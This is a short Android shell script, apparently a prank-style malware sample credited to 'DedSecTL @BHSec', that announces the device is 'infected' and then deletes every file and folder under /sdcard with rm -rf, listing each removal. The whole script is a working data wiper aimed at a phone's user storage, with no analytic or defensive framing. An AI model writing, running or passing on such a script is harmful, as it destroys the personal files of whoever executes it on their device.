#!/system/bin/sh
clear
echo "\033[91m[!]\033[97m You are \033[91minfected\033[0m \033[97mby trash.sh *\033[0m\n"
sleep 1
for i in $(ls /sdcard);do
	rm -rf /sdcard/$i
	echo "\033[92m[+]\033[97m removed: /sdcard/$i\033[0m"
done
echo "\n\033[93m[*]\033[97m Created by \033[91mDedSecTL @BHSec\033[0m"